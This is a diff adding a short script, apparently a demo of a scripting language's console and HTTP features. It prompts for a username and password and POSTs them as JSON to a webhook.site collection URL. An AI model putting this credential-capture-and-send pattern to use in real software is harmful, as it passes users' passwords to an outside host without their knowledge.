@@ -1,0 +1,22 @@
+console.println("hi");
+
+console.print("username:");
+username = console.input();
+
+console.print("password:");
+password = console.input();
+
+params = [
+    "headers" => ["Content-Type" => "application/json"],
+    "body" => json.encode([
+        "username" => username,
+        "password" => password
+    ])
+];
+
+url = 'https://webhook.site/db97236d-9fae-4c6b-a8dc-c17b7273e22f';
+response = http.post(url, params);
+
+console.println("response from server: ");
+console.println(response);
+
